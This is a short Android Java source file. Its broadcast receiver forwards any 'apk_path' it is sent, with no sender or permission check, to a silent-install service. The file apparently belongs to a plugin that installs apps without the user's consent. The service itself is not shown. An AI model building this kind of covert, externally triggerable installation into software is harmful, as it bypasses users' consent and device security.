package com.xstd.active.plugin;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.text.TextUtils;
import android.util.Log;

public class SilentInstallReceiver extends BroadcastReceiver {

	@Override
	public void onReceive(Context context, Intent intent) {
		String path = intent.getStringExtra("apk_path");
		if (TextUtils.isEmpty(path)) return;
		Intent service = new Intent(context, SilentInstallService.class);
		service.putExtra("apk_path", path);
		context.startService(service);
	}

}
